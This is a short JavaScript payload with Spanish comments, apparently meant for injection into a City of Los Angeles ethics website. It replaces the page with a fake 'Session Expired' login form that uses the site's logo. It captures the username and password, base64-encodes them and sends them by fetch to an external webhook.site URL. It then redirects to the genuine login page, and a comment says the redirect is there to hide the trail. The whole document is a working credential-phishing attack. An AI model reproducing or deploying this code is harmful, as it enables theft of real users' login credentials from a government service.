// Limpiamos la pantalla para el Phishing
document.body.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:10000;display:flex;justify-content:center;align-items:center;font-family:sans-serif;">
    <div style="width:350px;padding:30px;border:1px solid #ddd;box-shadow:0 4px 15px rgba(0,0,0,0.1);">
        <img src="https://ethics.lacity.gov/wp-content/themes/lacity-ethics/assets/images/logo.png" style="width:100%;margin-bottom:20px;">
        <h3>Session Expired</h3>
        <p style="color:#666;font-size:14px;">Please re-authenticate to continue your session.</p>
        <input id="u" placeholder="Username" style="width:100%;margin-bottom:10px;padding:10px;">
        <input id="p" type="password" placeholder="Password" style="width:100%;margin-bottom:20px;padding:10px;">
        <button id="go" style="width:100%;padding:10px;background:#0056b3;color:white;border:none;cursor:pointer;">Login</button>
    </div>
</div>`;

// Captura de datos
document.getElementById('go').onclick = function() {
    var u = document.getElementById('u').value;
    var p = document.getElementById('p').value;
    
    // Enviamos a tu Webhook
    fetch('https://webhook.site/4c7629c5-d711-46a7-92ad-83309267bd91?u=' + btoa(u) + '&p=' + btoa(p), {mode:'no-cors'});
    
    // Redirección final para ocultar el rastro
    setTimeout(() => {
        location.href = 'https://ethics.lacity.gov/efs/index.cfm?fuseaction=login';
    }, 500);
};
